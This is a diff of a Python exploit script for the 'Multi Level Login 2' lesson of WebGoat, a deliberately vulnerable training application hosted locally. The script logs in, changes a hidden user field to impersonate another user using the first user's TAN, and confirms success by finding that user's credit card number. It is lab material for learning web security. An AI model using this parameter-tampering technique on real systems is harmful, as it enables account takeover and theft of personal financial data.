@@ -1,41 +1,42 @@
 #!/usr/bin/python
 
+'''
+attack.py 
+
+exploits the Multi Level Login 2 WebGoat vulnerability
+'''
+
 import requests
 import re
-import sys
-
-wb_auth_url = 'http://127.0.0.1:8080/WebGoat/j_spring_security_check'
-wb_creds = {'username':'webgoat', 'password':'webgoat'}
-
-vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen=1111&menu=500'
-vuln_data = {'user2': 'Joe', 'pass2':'banana', 'Submit':'Submit'}
-
-headers = {'Context-Type': 'application/x-www-form-urlencoded;', 'Connection':'keep-alive'}
 
 # authenticate with webgoat
-r = requests.post(wb_auth_url, data=wb_creds)
+r = requests.post('http://127.0.0.1:8080/WebGoat/j_spring_security_check', data={'username':'webgoat', 'password':'webgoat'})
 
 # grab session cookie
 cookies = {'JSESSIONID': r.cookies['JSESSIONID']}
 
-# find lession id - it changes every session
+# request the lesson menu
 r = requests.get('http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc', cookies=cookies)
 
+# find vulnerable url screen id
 m = re.search("Multi Level Login 2', u'showHints': True, u'link': u'attack\?Screen=(\d+)", str(r.json))
-attack_id =  m.group(1)
+vuln_id =  m.group(1)
+vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen={id}&menu=500'.format(id=vuln_id)
 
-vuln_url = 'http://127.0.0.1:8080/WebGoat/attack?Screen={}&menu=500'.format(attack_id)
-vuln_data = {'user2': 'Joe', 'pass2':'banana', 'Submit':'Submit'}
+# authenticate at the first level as Joe:banana
+v = requests.post(vuln_url, 
+                  data={'user2':'Joe', 'pass2':'banana'}, 
+                  cookies=cookies)
 
-# authenticate with valid credentials at vulnerable url
-v = requests.post(vuln_url, headers=headers, data=vuln_data, cookies=cookies)
+# try to authenticate at second level as Jane but using Joe's TAN
 
-# exploit poor session management
-data = {'hidden_user': 'Jane', 'tan2': 15161, 'Submit': 'Submit'}
+x = requests.post(vuln_url,
+                  data={'hidden_user': 'Jane', 'tan2': 15161, 'Submit': 'Submit'},
+                  cookies=cookies)
 
-x = requests.post(vuln_url, data=data, cookies=cookies)
+# Search for Janes last name and CCN
+surname = re.search("Plane", x.text)
+ccn = re.search("74589864", x.text)
 
-m = re.search("74589864", x.text)
-
-if m is not None:
+if surname and ccn:
   print("Attack Successful.")
